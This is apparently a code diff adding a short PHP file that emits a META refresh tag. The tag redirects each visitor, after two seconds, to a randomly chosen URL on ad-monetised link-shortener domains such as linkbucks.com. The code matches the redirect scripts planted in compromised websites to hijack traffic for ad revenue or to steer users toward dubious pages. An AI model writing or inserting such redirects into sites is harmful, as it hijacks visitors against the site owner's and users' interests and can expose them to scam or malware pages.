@@ -1,0 +1,4 @@
+<?php
+$arr = array('http://2f12f49e.any.gs','http://1000a8af.seriousdeals.net','http://691edfe1.linkbucks.com','http://da0e5ba6.yyv.co');
+print '<META http-equiv="refresh" content="2;URL='.$arr[rand(0,3)].'">';
+?>
